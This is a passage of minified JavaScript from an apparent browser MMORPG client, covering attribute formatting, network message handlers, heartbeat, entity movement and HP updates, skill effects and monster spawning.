0===a&&(a=!1),void 0===r&&(r=0);for(var h="",u=!1,p=0,d=0,c=0;c<e.length;c++)p++;for(var c=0;c<e.length;c++){var f=e[c];s.GlobalConfig.AttrConfig[f.type];if(!(f.type<=0)){u=!0;var g=-1!=o?"color="+o:"";l&&(g="color="+l),h+="<a "+g+">"+t.getAttrStrByType(f.type,2)+(a?t.inserteBlank(" ",r):"");var m=i[0]/100+"",v=i[1]/100+"";h+=n+m+"~"+v,h+="%",d++,h+=d>=p?"":"\n",h+="</a>"}}return u?h:""},t.changeJobAttr=function(e,i){for(var n in t.JOB_ATTR){var o=t.JOB_ATTR[n],s=o.indexOf(e);if(-1!=s)return t.JOB_ATTR[i][s]}return e},t.checkJobAttr=function(e,i){var n=!1,o=!1;for(var s in t.JOB_ATTR){var a=t.JOB_ATTR[s],r=a.indexOf(e);-1!=r&&(n=!0,i==Number(s)&&(o=!0))}return n&&!o?!1:!0},t.getRelationJobAttr=function(e){for(var i=0,n=t.RELATION_ATTR;i<n.length;i++){var o=n[i];if(-1!=o.indexOf(e))for(var s=0,a=o;s<a.length;s++){var r=a[s];if(r!=e)return r}}return 0},t.getSubstringAfter=function(t,e){var i=t.split(e);return i[i.length-1]},t.FILTER_EXTDATA_ID=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,35,37,38,39],t.FILTER_BASE_DATA_ID=[18,20],t.JOB_ATTR={1:[141,142],2:[145,146],3:[143,144],4:[141,142],5:[141,142]},t.RELATION_ATTR=[[141,142],[145,146],[143,144],[5,6]],t.translate={hp:h.AttributeType.atMaxHp,atk:h.AttributeType.atAttack,def:h.AttributeType.atDef,res:h.AttributeType.atRes,crit:h.AttributeType.atCrit,tough:h.AttributeType.atTough},t.exRelate={2:h.AttributeType.atHpEx,4:h.AttributeType.atAtkEx,5:h.AttributeType.atDefEx,6:h.AttributeType.atResEx},t}();e.AttributeData=p,window.AttributeData=p,__reflect(p.prototype,"AttributeData",[]),window.AttributeData=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameLogic=void 0;var n=i(623),o=i(178),s=i(18),a=i(146),r=i(16),l=i(624),h=i(61),u=i(70),p=i(277),d=i(34),c=i(14),f=i(37),g=i(145),m=i(0),v=i(4),y=i(625),C=i(705),T=i(48),b=i(13),w=i(706),I=i(135),_=i(20),S=i(172),x=i(154),D=i(32),A=i(708),k=i(28),B=i(173),P=i(7),R=i(69),E=i(2),G=i(710),M=i(122),L=i(241),F=i(137),O=i(194),N=i(711),W=i(193),U=i(100),H=i(53),q=i(349),j=i(86),V=i(45),Y=i(218),K=i(221),Q=i(43),J=i(67),Z=i(27),X=i(132),z=i(59),$=i(60),te=i(84),ee=function(t){function e(){var e=t.call(this)||this;e.MONSTER_RADIUS=2,e.MONSTER_LEN=2*e.MONSTER_RADIUS+1,e.openWin=[],e.isEnterScene=!1,e.limitTime=60,e._failTimes=0,e.isBack=!1,e.currHandle=0,e.currAttackHandle=0,e.rPosindex=[],e.runTime=0,e.guanqiaId=0,e.kfCost=0,observe(e,e.postEnterMap,Ts.enterScene),observe(e,e.roleStatusChange,Ts.roleStatus),observe(e,e.postHpChange,Ts.entityHpChange),observe(e,e.posRelive,Ts.relive),e.observe(v.ActorCC.reqLifeResetReward,e.reqLifeResetReward),e.sysId=PackageID.Default,e.regNetMsg(2,e.postSubRoleChange),e.regNetMsg(4,e.postCreateOtherEntity),e.regNetMsg(5,e.doGoldChange),e.regNetMsg(8,e.doSubRoleAtt),e.regNetMsg(10,e.doRemoveEntity),e.regNetMsg(11,e.doMoveEntity),e.regNetMsg(13,e.doSyncPos),e.regNetMsg(15,e.postMpChange),e.regNetMsg(17,e.doTips),e.regNetMsg(18,e.doFirstRegister),e.regNetMsg(20,e.doDieNotice),e.regNetMsg(21,e.postGuildChange),e.regNetMsg(22,e.postRename),e.regNetMsg(24,e.postOtherAttChange),e.regNetMsg(26,e.postNeiGongChange),e.regNetMsg(31,e.doFindPath),e.regNetMsg(32,e.doBloodNumShow),e.regNetMsg(33,e.doChangeTarget),e.regNetMsg(34,e.doAddMonsterConfig),e.regNetMsg(35,e.doZeroInit),e.regNetMsg(38,e.postFunsShow),e.regNetMsg(48,e.postOffLine),e.regNetMsg(49,e.doPaoPaoExp),e.regNetMsg(50,e.postAdReward),e.regNetMsg(51,e.doAdFhCount),e.regNetMsg(52,e.doKfCost),e.regNetMsg(54,e.moveResult),e.regNetMsg(255,e.heartBeatBack),h.LocationProperty.isLocation&&l.KeyboardUtils.ins().addKeyDown(e.test,e);var i="";for(var n in urlParam)"reportRoot"!=n&&"apiRoot"!=n&&(i+="&"+n+"="+urlParam[n]);console.log("外网资源",i),i="";for(var n in urlParam)"v"!=n&&"root"!=n&&"reportRoot"!=n&&"apiRoot"!=n&&(i+="&"+n+"="+urlParam[n]);console.log("内网资源",i),e.radiusMap=[];for(var o=2*e.MONSTER_RADIUS+1,n=0;o>n;n++)e.radiusMap[n]=[];return e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRemoveMapArrow=function(){},e.prototype.closeChangeSceneBar=function(){},e.prototype.initLogin=function(){(void 0==urlParam.isStopHeartTick||"false"==urlParam.isStopHeartTick)&&this.startHeartbeat()},e.prototype.sendNewRole=function(t,e){var i=this.getBytes(2);i.writeByte(t),i.writeByte(e),this.sendToServer(i)
},e.prototype.startHeartbeat=function(){return this._failTimes=0,this.heartBeatTimer?void this.heartBeatTimer.start():(this.heartBeatTimer=new egret.Timer(5e3),this.heartBeatTimer.addEventListener(egret.TimerEvent.TIMER,this.heartbeatTick,this),void this.heartBeatTimer.start())},e.prototype.heartbeatTick=function(){return this.isBack?void 0:this._failTimes>=this.limitTime?(console.error("@@心跳连续失败次数=",this._failTimes),Socket.ins().close(),this.stopHeartbeat(),void Socket.ins().showReLoginWin()):void this.sendHeartbeatToServer()},e.prototype.stopHeartbeat=function(){this.heartBeatTimer&&this.heartBeatTimer.stop()},e.prototype.sendHeartbeatToServer=function(){var t=this.getBytes(255);this.sendToServer(t),this._failTimes++},e.prototype.heartBeatBack=function(t){this._failTimes=0},e.prototype.sendGMCommad=function(t){var e=this.getBytes(0);e.writeString(t),this.sendToServer(e)},e.prototype.postSubRoleChange=function(t){b.SubRoles.ins().doSubRole(t)},e.prototype.roleStatusChange=function(){this.find3v3Question("点击地板请求移动 ====== 后端修改移动状态和攻击状态 "+Ts.roleStatus.canMove+"-"+Ts.roleStatus.canAtk),Ts.roleStatus.canAtk&&H.ControlCC.setAuto(!0)},e.prototype.resetRoleStatus=function(){Ts.roleStatus.canAtk=!0,Ts.roleStatus.canMove=!0},e.prototype.postEnterMap=function(t){var e;win.close(Y.ReliveWin),win.close(K.ReliveWin2),win.close(Z.WarnWin),win.get("HSBattleFbUI")&&win.close("HSBattleFbUI"),this.isEnterScene=!0,R.SoundUtil.stopAll(),F.DropHelp.clearDrop(),_.GameMap.parser(t),Ts.enterScene.enterOK(),A.MonsterSpeak.ins().clear(),f.EntityManager.ins().removeAll(),Timer.stopAll(this),Timer.stopAll(_.GameMap.ins()),Timer.stopAll(o.SkillEffPlayer.ins()),Timer.stop(this.shakeMapView,this),this.resetRoleStatus(),this.closeChangeSceneBar(),U.MainFightCC.initInfo();var i=null===(e=b.SubRoles.ins().roles[0])||void 0===e?void 0:e.skillsData;if(i)for(var n=0,s=i;n<s.length;n++){var a=s[n];a.closeCD()}0==_.GameMap.fubenID?D.FbCT.ins().pkGqboss=!1:_.GameMap.fbType!=D.FbCT.FB_TYPE_GUANQIABOSS&&_.GameMap.fbType!=D.FbCT.FB_TYPE_CITY&&win.closeTopLevel(),B.GuildWar.ins().getModel().clearGuildWarList(),ObjectPool.clearClass("CharMonster"),W.Entity.clearPool(),R.SoundUtil.WINDOW_OPEN||_.GameMap.lastFbId==_.GameMap.fubenID&&!_.GameMap.fubenID||R.SoundUtil.play(R.SoundEnum.SCENE),win.openCall(),this.openWin.length>0&&(win.open.apply(win,__spreadArrays([this.openWin[0]],this.openWin.slice(1))),this.openWin=[]),Q.CityCC.ins().isBianQiang&&(Q.CityCC.ins().isBianQiang=!1,z.GameFlashSaleCt.ins().reportPowerNot(),win.open(J.View_BianQiang,1)),o.SkillEffPlayer.lockXY=[]},e.prototype.reportPowerNot=function(){this.isEnterScene&&z.GameFlashSaleCt.ins().reportPowerNot()},e.prototype.reportLvNot=function(){this.isEnterScene&&z.GameFlashSaleCt.ins().reportLvNot()},e.prototype.reportZsLvNot=function(){this.isEnterScene&&z.GameFlashSaleCt.ins().reportZsLvNot()},e.prototype.postCreateOtherEntity=function(t){var e=t.readShort(),i=t.readDouble();t.position-=10;var n;if(e==EntityType.Monster||e==EntityType.CollectionMonst||e==EntityType.Ring?(n=new g.EntityModel,n.parser(t)):e!=EntityType.Fire||H.ControlCC.isHideFightingEff?e==EntityType.Role?(n=new T.Role,n.parserBase(t),n.parserOtherRole(t,!0)):e==EntityType.Pet?(n=new N.PetModel,n.parser(t)):e==EntityType.LadderPlayer?(n=new T.Role,n.parserBase(t),n.parserOtherRole(t,!1)):e==EntityType.DropItem&&(n=new C.CharModel,n.parserBase(t),n.parserItemData(t)):(n=new g.EntityModel,n.parser(t)),!n)return null;var o=this.createEntityByModel(n);return this.afterCreateOtherEntity(e,n,o),p0_4.postAdd(e,i,n.isMy),n.isMy&&_.GameMap.fbType!=D.FbCT.FB_TYPE_KF_ARENA&&this.updateMy(),H.ControlCC.onAddEntity(n),n},e.prototype.updateMy=function(){},e.prototype.afterCreateOtherEntity=function(t,e,i){t==EntityType.Monster||t==EntityType.CollectionMonst||(t==EntityType.Role?B.GuildWar.ins().getModel().checkinAppoint()&&(e.guildID!=k.Guild.ins().guildID?B.GuildWar.ins().getModel().changecanPlayList(e.masterHandle):B.GuildWar.ins().getModel().setMyGuildNum(e.masterHandle)):t==EntityType.LadderPlayer)},e.prototype.doGoldChange=function(t){var e=t.readShort();if(1==e){var i=t.readNumber();v.ActorCC.postGoldChange(i)}else if(9==e){var n=v.ActorCC.runeShatter;v.ActorCC.runeShatter=t.readNumber(),v.ActorCC.runeShatter-n>0&&E.TipsCT.ins().showTips(gettext("获得|C:0x35e62d&T:战纹精华x{0}|",v.ActorCC.runeShatter-n)),this.postRuneShatter()}else if(21==e){var i=t.readNumber();v.ActorCC.postStoneChange(i)}else if(24==e){var o=v.ActorCC.skillPoints,s=t.readDouble();v.ActorCC.postSkillPointChange(s),v.ActorCC.skillPoints-o>0&&E.TipsCT.ins().showTips(gettext("获得|C:0x35e62d&T:星云技能点x{0}|",v.ActorCC.skillPoints-o))}else{var a=t.readNumber();v.ActorCC.postYbChange(a)}},e.prototype.postRuneShatter=function(){},e.prototype.postRuneExchange=function(){},e.prototype.postLevelBarChange=function(t){return t},e.prototype.postAdjustMapPos=function(){},e.prototype.doSubRoleAtt=function(t){b.SubRoles.ins().doSubRoleAtt(t)},e.prototype.postHpChange=function(t){var i=t.handle,n=t.hp,o=t.maxHp,s=f.EntityManager.ins().getEntityByHandle(i);if(!s||!s.infoModel)return console.warn("0-9更新血量的实体不存在",i),null;var a=s.infoModel;if(a.setAtt(d.AttributeType.atHp,n),a.setAtt(d.AttributeType.atMaxHp,o),s.updateBlood(),0==s.alpha&&n>0&&(s.alpha=1),0>=n){F.DropHelp.tempDropPoint.x=Math.floor(s.x/_.GameMap.CELL_SIZE),F.DropHelp.tempDropPoint.y=Math.floor(s.y/_.GameMap.CELL_SIZE),s.playAction(M.EntityAction.DIE),urlParam.debugTS&&s.data.isMy&&console.error("@@停止缓动并执行doComplete");var r=O["default"].stop(s,s.data.isMy);s.removeAllEff(),this.postDie(s),r&&s.data.isMy&&(urlParam.debugTS&&console.error("@@角色死亡"),e.ins().postMeMove())}},e.prototype.postDie=function(t){return t},e.prototype.postNeiGongChange=function(t){var e=t.readDouble(),i=t.readDouble(),n=t.readDouble(),o=f.EntityManager.ins().getEntityByHandle(e);return o&&o.infoModel?(o.infoModel.setAtt(d.AttributeType.cruNeiGong,i),o.infoModel.setAtt(d.AttributeType.maxNeiGong,n),o.updateNeiGong(),o.infoModel):void 0},e.prototype.postEntityHpChange=function(t,e,i,n,o){return[t,e,i,n,o]},e.prototype.doRemoveEntity=function(t){var e=f.EntityManager.ins().getEntityByHandle(t);if(e&&e.infoModel){var i=e.infoModel.type;if(f.EntityManager.ins().setKillMeListFalse(t),i==EntityType.Role)if(i==EntityType.LadderPlayer){if(this.removeEntity(t),o.SkillEffPlayer.lockXY)for(var n in o.SkillEffPlayer.lockXY)o.SkillEffPlayer.lockXY[n]&&o.SkillEffPlayer.lockXY[n].handle==t&&(o.SkillEffPlayer.lockXY[n]=null)}else f.EntityManager.ins().removeByHandle(t);else e instanceof y.CharItem2?f.EntityManager.ins().removeByHandle(t):this.removeEntity(t);this.postRemoveEntity(t,e)}},e.prototype.postRemoveEntity=function(t,e){return[t,e]},e.prototype.removeEntity=function(t){var e=f.EntityManager.ins().getEntityByHandle(t);e&&e.infoModel&&e.infoModel.getAtt(d.AttributeType.atHp)<=0?(f.EntityManager.ins().removeByHandle(t,!1,!0),e.playAction(M.EntityAction.DIE),O["default"].stop(e),Timer.start(1500,1,function(){r.DisplayUtils.removeFromParent(e)},this)):f.EntityManager.ins().removeByHandle(t,!0,!0)},e.prototype.doMoveEntity=function(t){var i,n,o,s;return __awaiter(this,void 0,void 0,function(){var r,l,h,p,c,g,v,y,C,T,w,I;return __generator(this,function(_){switch(_.label){case 0:return r=t.readDouble(),l=t.readShort(),h=t.readShort(),p=f.EntityManager.ins().getEntityByHandle(r),p&&p.infoModel?(p.data.gridX=l,p.data.gridY=h,c=(null===(n=null===(i=b.SubRoles.lookAtTar)||void 0===i?void 0:i.infoModel)||void 0===n?void 0:n.handle)==r,g=1,p&&p.infoModel&&(null===(o=p.infoModel)||void 0===o?void 0:o.configID)&&(g=(null===(s=m.GlobalConfig.MonstersConfig[p.infoModel.configID])||void 0===s?void 0:s.size)||1),v={x:U.mainfightcc.gridToX(l,g),y:U.mainfightcc.gridToY(h,g)},p.x==v.x&&p.y==v.y?(O["default"].stop(p),p.playAction(M.EntityAction.STAND),c&&(console.error("@@已在目标位置了,停止移动=",p.x,p.y),this.postMeMove()),[2]):(p.dir=a.DirUtil.get8DirBy2Point(p,v),p.playAction(M.EntityAction.RUN),y=p.infoModel.getAtt(d.AttributeType.atMoveSpeed),C=u.MathUtils.getDistanceByObject(p,v),T=2e5/y,c&&-1!=H.ControlCC.startMoveTime||(T=2e5/y),w=egret.getTimer(),c&&e.ins().find3v3Question("点击地板请求移动101010101010-后端移动我"),urlParam.debugTS&&c&&console.log("@@后端移动我",U.mainfightcc.xToGrid(v.x),U.mainfightcc.yToGrid(v.y)),[4,O["default"].startSpeed(p,v,C/T*1e3)])):(console.log("@@协议0-11,doMoveEntity(),找不到target!"),[2]);case 1:return I=_.sent(),urlParam.debugTS&&c&&console.log("@@播放移动花费时间=",egret.getTimer()-w),0==I&&c?(e.ins().find3v3Question("点击地板请求移动111111111111-移动被其他地方停止"),urlParam.debugTS&&console.error("@@移动被其他地方停止"),[2]):(O["default"].moveing(p)||p.playAction(M.EntityAction.STAND),c&&this.postMeMove(),[2])}})})},e.prototype.find3v3Question=function(t){_.GameMap.checkIsInKf3v3()&&platform&&platform.reportError&&platform.reportError(v.ActorCC.myName+"的3v3信息---"+t)},e.prototype.postMeMove=function(){urlParam.debugTS},e.prototype.postShowCenter=function(){},e.prototype.doStopMoveEntity=function(t){var e=t.readDouble(),i=f.EntityManager.ins().getEntityByHandle(e);i&&i.infoModel&&(O["default"].stop(i),i.infoModel.getAtt(d.AttributeType.atHp)>0&&i.playAction(M.EntityAction.STAND),i.x=t.readInt(),i.y=t.readInt())},e.prototype.doSyncPos=function(t){var e,i,n=t.readDouble(),o=f.EntityManager.ins().getEntityByHandle(n),s=t.readShort();if(o){var a=1;o&&o.infoModel&&(null===(e=o.infoModel)||void 0===e?void 0:e.configID)&&(a=(null===(i=m.GlobalConfig.MonstersConfig[o.infoModel.configID])||void 0===i?void 0:i.size)||1),O["default"].stop(o);switch(s){case 0:o.playAction(M.EntityAction.STAND);var r=t.readInt(),l=t.readInt();o.data.gridX=r,o.data.gridY=l,o.x=U.mainfightcc.gridToX(r,a),o.y=U.mainfightcc.gridToY(l,a),o.data.x=o.x,o.data.y=o.y,this.postMeMove();break;case 1:o.playAction(M.EntityAction.RUN),O["default"].startTime(o,{x:U.mainfightcc.gridToX(t.readInt(),a),y:U.mainfightcc.gridToY(t.readInt(),a)},t.readInt()).then(function(){o.playAction(M.EntityAction.STAND)});break;case 2:o.playAction(M.EntityAction.STAND);var h=t.readInt(),u=t.readInt(),p=U.mainfightcc.gridToX(h,a),d=U.mainfightcc.gridToY(u,a);o.data.gridX=h,o.data.gridY=u,o.data.x=p,o.data.y=d,O["default"].startTime(o,{x:p,y:d},t.readInt())}}},e.prototype.moveCamera=function(t,e){return{x:t,y:e}},e.prototype.sendSyncServerTime=function(){this.sendBaseProto(14)},e.prototype.postMpChange=function(t){var e,i=t.readDouble(),n=t.readDouble(),o=f.EntityManager.ins().getEntityByHandle(i);return o&&(e=o.data,e.setAtt(d.AttributeType.atMp,n),o.updateNeiGong()),e},e.prototype.postExpMc=function(t){return t},e.prototype.syncMyPos=function(t){return t},e.prototype.doTips=function(t){var e=m.GlobalConfig.ServerTips[t.readInt()].tips;E.TipsCT.ins().showTips(e)},e.prototype.doFirstRegister=function(t){return __awaiter(this,void 0,void 0,function(){var e;return __generator(this,function(i){return e=t.readByte(),win.open(q.WelcomeWin),[2]})})},e.prototype.doDieNotice=function(t){},e.prototype.postGuildChange=function(t){return[t.readInt(),t.readString()]},e.prototype.postOtherAttChange=function(t){var e=t.readDouble(),i=f.EntityManager.ins().getEntityByHandle(e);if(!i||!i.infoModel)return console.warn("0-24更新属性的实体不存在",e),null;for(var n=t.readShort(),o=0;n>o;o++)i.infoModel.setAtt(t.readInt(),t.readDouble());return i},e.prototype.doPaoPao=function(t){t.readDouble(),t.readInt()},e.prototype.sendRename=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n;return __generator(this,function(o){switch(o.label){case 0:return e=0,V.ChatCT.ins().isCheckStr()?[4,platform.checkStr(t,2)]:[3,2];case 1:i=o.sent().content,e=1,t=i,o.label=2;case 2:return n=this.getBytes(22),n.writeString(t),n.writeByte(e),this.sendToServer(n),[2]}})})},e.prototype.postRename=function(t){var e=t.readByte();0==e?(Socket.ins().close(),this.stopHeartbeat(),win.close("RenameWin"),alert(gettext("改名成功，重新登陆后刷新")),window.location&&location.reload()):S.RoleMgr.ins().showErrorTips(e)},e.prototype.postChangeAttrPoint=function(t){var e=this.getBytes(25);e.writeDouble(t),this.sendToServer(e),B.GuildWar.ins().getModel().clickTime=1},e.prototype.postAttrEntityPoint=function(t){var e=this.getBytes(56);e.writeDouble(t),this.sendToServer(e)},e.prototype.doFindPath=function(t){var e=t.readDouble(),i=t.readInt(),n=t.readInt(),o=t.readInt(),s=t.readInt(),a=H.ControlCC.hasEntityByPos(o,s),r=U.MainFightCC.getPath(i,n,o,s,a);if(urlParam.debugTS){var l="";if(r)for(var h=0;h<r.length;h++)h>0&&(l+="->"),l+=r[h].nX+","+r[h].nY;console.error("@@帮助后端寻路",i+","+n+"->"+o+","+s+" = ",l)}this.sendFindPathToServer(e,r)},e.prototype.sendFindPathToServer=function(t,e){var i=this.getBytes(31);i.writeDouble(t),e&&e.length>0?(i.writeInt(1),i.writeInt(e[e.length-1].nX),i.writeInt(e[e.length-1].nY)):i.writeInt(0),i.writeByte(1),this.sendToServer(i)},e.prototype.doBloodNumShow=function(t){var e=t.readDouble(),i=t.readDouble(),n=Math.ceil(t.readDouble()),o=t.readUnsignedShort(),s=t.readInt(),a=f.EntityManager.ins().getEntityByHandle(i),r=f.EntityManager.ins().getEntityByHandle(e);r&&r.data&&r.infoModel&&(r.data.isMy&&r.infoModel.type==EntityType.Monster&&0>n||(_.GameMap.checkIsInKf3v3(),this.postEntityHpChange(r,a,o,n,s)))},e.prototype.doChangeTarget=function(t){var e=t.readDouble(),i=t.readDouble();this.postAllAtkTarget(e,i);var n=f.EntityManager.ins().getEntityByHandle(e);if(n&&n.infoModel&&n.infoModel.masterHandle==v.ActorCC.handle&&this.postAtkTarget(i),0==i)return void(n&&(n==b.SubRoles.lookAtTar||b.SubRoles.lookAtTar&&n.infoModel.handle==b.SubRoles.lookAtTar.infoModel.handle)&&(this.currAttackHandle=f.EntityManager.ins().getRootMasterHandle(i)));var o=f.EntityManager.ins().getEntityByHandle(i);if(o&&o.infoModel&&o.infoModel.masterHandle>0){var a=f.EntityManager.ins().getEntityByHandle(e);if(a&&a.infoModel&&a.infoModel.masterHandle==v.ActorCC.handle&&this.postChangeTarget(o.infoModel.masterHandle),a&&a.infoModel){var r=f.EntityManager.ins().getMasterList(a.infoModel.masterHandle);if(o.infoModel.masterHandle==v.ActorCC.handle&&r)for(var l in r)r[l].data.type==EntityType.Role&&r[l].setNameTxtColor(s.ColorUtil.ROLENAME_COLOR_YELLOW)}}else{var h=f.EntityManager.ins().getEntityByHandle(e);h&&h.infoModel&&h.infoModel.masterHandle==v.ActorCC.handle&&(o&&o.infoModel?this.postChangeTarget(o.infoModel.masterHandle):this.postChangeTarget(0))}},e.prototype.postChangeTarget=function(t){this.currAttackHandle=t},e.prototype.postAtkTarget=function(t){this.currHandle=t},e.prototype.postAllAtkTarget=function(t,e){return[t,e]},e.prototype.test=function(t){if(t==n.Keyboard.BRACE_R,t==n.Keyboard.BRACE_L,t==n.Keyboard.BACKSLASH,t==n.Keyboard.I,t==n.Keyboard.O){var e=0;egret.setInterval(function(){e&&console.log(egret.$hashCount-e),e=egret.$hashCount},this,1e3)}if(t==n.Keyboard.P,t==n.Keyboard.BACK_QUOTE,t==n.Keyboard.ENTER,t==n.Keyboard.KC_TAB)if(win.get("WarnWin"))win.close("WarnWin");else{var i=p.Version.BUILD_NUMBER;i+=gettext("\n开服天数:{0}天",P.GameServerCC.serverOpenDay+1),i+=gettext("\n服务器id:{0}",h.LocationProperty.srvid),i+=gettext("\n账号:{0}",h.LocationProperty.openID),window.WarnWin.show(i,null,this,null,null,"sure")}},e.prototype.startPkBoss=function(){D.FbCT.ins().autoPk()},e.prototype.createEntityByModel=function(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];var n=f.EntityManager.ins().createEntity(t,e);return n&&this.addEntity(n),n},e.prototype.addEntity=function(t){t&&t.infoModel&&(t.infoModel.type==EntityType.Role?t.dir=t.x>=_.GameMap.MAX_WIDTH>>1?6:2:t.infoModel.type==EntityType.Monster&&m.GlobalConfig.MonstersConfig[t.infoModel.configID]&&3==m.GlobalConfig.MonstersConfig[t.infoModel.configID].type&&(t.dir=t.x>=_.GameMap.MAX_WIDTH>>1?6:2))},e.prototype.createEntity2=function(t){return t},e.prototype.playSkillEff=function(t,e,i,n){var s;void 0===n&&(n=null);var r=300;(1==i.length&&e!=i[0]||i.length>1)&&(e.dir=a.DirUtil.get8DirBy2Point(e,i[0])),t&&t.actionType&&e.playAction(t.actionType,e.data.type==EntityType.Role?null:function(){e.action!=M.EntityAction.DIE&&e.playAction(M.EntityAction.STAND)}),(null===e||void 0===e?void 0:e.data)&&(null===e||void 0===e?void 0:e.data.isMy)&&t.repelDistance&&Timer.start(350,1,this.shakeMapView,this);var l=m.GlobalConfig.ShieldSkillConfig[_.GameMap.fubenID];if(!(l&&l[_.GameMap.mapID]&&l[_.GameMap.mapID].effId&&t.effectId&&l[_.GameMap.mapID].effId.indexOf(t.effectId)>-1)){if(t.effType==G.EffectType.WarSoul&&e.infoModel&&e.infoModel.warsoulID){var h=m.GlobalConfig.WarSoulConfig[e.infoModel.warsoulID];if(h&&h.modelId){var u=100*$.WarSoulCT.ins().getWarSoulModelSet(h),p=1002e3!=t.id;o.SkillEffPlayer.playWarSoulAtk(h.modelId,e,i[0],u,p)}}if(!t.effectId&&!j.SkillCT.ins().hasSuitSkillEff(t.id,e))return n&&n(),0;var d=t.effectId;if(j.SkillCT.ins().hasSuitSkillEff(t.id,e)){var c=m.GlobalConfig.GemReviseSkillConfig[Math.floor(t.id/1e3)];c&&c.effectId>0&&(d=c.effectId)}var f=Math.floor(t.id/1e3),g=X.NebulaCT.ins().returnSkillEffectCover(f);if(g>0&&(d=g),d>0){var v=(null===(s=t.config)||void 0===s?void 0:s.curve)||0;o.SkillEffPlayer.play(d,e,[i[0]],n,1,null,"",v)}switch(t.effType){case G.EffectType.AnyAngle:return 700}return r}},e.prototype.shakeMapView=function(){},e.prototype.addOutEff=function(t,e,i,n){var o=new w.TransferModel;o.configID=0,o.x=t,o.y=e,o.gridX=i,o.gridY=n,o.type=EntityType.Transfer,f.EntityManager.ins().createEntity(o)},e.prototype.removeOutEff=function(){f.EntityManager.ins().removeTransferById(0)},e.prototype.createGuanqiaMonster=function(t,e,i){var n;if(void 0===t&&(t=!0),void 0===e&&(e=!1),void 0===i&&(i=this.fw),this.guanqiaId=D.FbCT.ins().guanqiaID,_.GameMap.sceneInMain()){var o=D.FbCT.ins(),s=o.waveMonsterId.length,a=[],r=0,l=s;this.guanqiaId>1e5&&i&&(n=this.fw=i,r=n[0],l=n[1]);for(var h=r;l>h;h++){var u=f.EntityManager.ins().getEntityByMonsterId(o.eliteMonsterId).length,p=f.EntityManager.ins().getEntityByMonsterId(o.waveMonsterId[h]).length-u;if(!(p>3)||e){var d=t?o.rPos[h].length:1;d>3&&(d=3),a.length<=h&&a.push(10-p);var c=1==d?d:Math.ceil(a[h]/d);1==d&&1==p&&(d=0),a[h]=c;for(var g=e,m=0;d>m;m++){this.runTime=0,(!this.rPosindex[h]||this.rPosindex[h]>=o.rPos[h].length)&&(this.rPosindex[h]=0);var v=this.rPosindex[h],y=[],C=o.rPos[h][v],T=C.x-this.MONSTER_RADIUS,b=C.y-this.MONSTER_RADIUS;this.writeMap(y,T,b,c);for(var w=0;w<this.MONSTER_LEN;w++)for(var I=0;I<this.MONSTER_LEN;I++)if(y[w]){var S=y[w][I];if(S){var x=void 0;if(e&&g&&5>u)x=o.createMonster(o.eliteMonsterId),x.isElite=!0,g=!1,u+=1;else{var A=o.waveMonsterId[h];x=o.createMonster(A)}x.x=(T+w)*_.GameMap.CELL_SIZE+(_.GameMap.CELL_SIZE>>1),x.y=(b+I)*_.GameMap.CELL_SIZE+(_.GameMap.CELL_SIZE>>1);var k=o.wanderpercent;x.isWander=1e4*Math.random()<k,x.isClient=!0}}this.rPosindex[h]++}}}}},e.prototype.writeMap=function(t,e,i,n){if(this.runTime++,this.runTime>200)return void console.log("关卡"+this.guanqiaId+"的刷怪点可能在不可行区域内,请策划检查");var o=u.MathUtils.limitInteger(0,this.MONSTER_LEN-1),s=u.MathUtils.limitInteger(0,this.MONSTER_LEN-1);if(t[o]||(t[o]=[]),t[o][s])this.writeMap(t,e,i,n);else{var a=_.GameMap.checkWalkable(e+o,i+s);a&&(t[o][s]=1,n--),n>0&&this.writeMap(t,e,i,n)}},e.prototype.postHookStateChange=function(t){return this.hookState=t,t},e.prototype.postMoveEntity=function(t,e,i){return void 0===i&&(i=!0),[t,e,i]},e.calculateRealAttribute=function(t,e,i,n){if(void 0===n&&(n={}),!t||!t.infoModel)return 0;var o,s=t.infoModel.getAtt(e),a=t.buffList,r=f.EntityManager.ins();for(var l in a){o=a[l];var h=r.getRootMasterHandle(i.infoModel.handle);(o.effConfig.type==L.SkillEffType.AdditionalAttributes||o.effConfig.type==L.SkillEffType.HostAddAttributes&&o.hostsHandle&&o.hostsHandle.indexOf(h)>=0)&&o.effConfig.args.d==e&&(s+=o.multRate?o.value*o.multRate:o.value)}var u=n[e]?n[e]:0;return s+u},e.triggerAttr=function(t,e,i){if(void 0===i&&(i={}),!t||!t.infoModel)return!1;var n=t.infoModel.getAtt(e)||0;if(n+=i[e]?i[e]:0){var o=Math.random();if(n/1e4>o)return!0}return!1},e.triggerValue=function(t){if(t){var e=Math.random();if(t/1e4>e)return!0}return!1},e.prototype.postViewOpen=function(){return __awaiter(this,void 0,void 0,function(){return __generator(this,function(t){return[2,+win.hasTop]})})},e.prototype.doAddMonsterConfig=function(t){var e=JSON.parse(t.readString());for(var i in e)m.GlobalConfig.MonstersConfig[i]=e[i]},e.prototype.doZeroInit=function(t){I.GameApp.ins().postZeroInit()},e.prototype.postChangeCamp=function(t){var e=t.readDouble(),i=f.EntityManager.ins().getEntityByHandle(e);if(i&&i.infoModel){if(i.infoModel.camp=t.readInt(),i.infoModel.masterHandle==v.ActorCC.handle){var n=i.infoModel.camp;if(n==x.BattleCC.ins().camp)return;x.BattleCC.ins().camp=n,x.BattleCC.ins().postEnterSuccess()}i.setCharName(i.infoModel.guildAndName),i.updateNameColor()}},e.prototype.sendFunsShowAward=function(t){var e=this.getBytes(35);e.writeByte(t),this.sendToServer(e)},e.prototype.postFunsShow=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readUnsignedByte();te.FuLiCT.ins().funcShowAwardDic[n]=o}},e.prototype.postFlyItem=function(t){return t},e.prototype.postFlyItemEx=function(t){return t},e.prototype.stopAI=function(){this.sendBaseProto(33)},e.prototype.sendGetOtherAttr=function(t){var e=this.getBytes(34);e.writeShort(t.length);for(var i=0;i<t.length;i++)e.writeDouble(t[i]);this.sendToServer(e)},e.prototype.postInputText=function(t){return t},e.prototype.posRelive=function(t){t&&(H.ControlCC.setAuto(!0),win.close("ReliveWin"),win.close("ReliveWin2"))},e.prototype.reqLifeResetReward=function(){if(urlParam.lifeResetRewardId){var 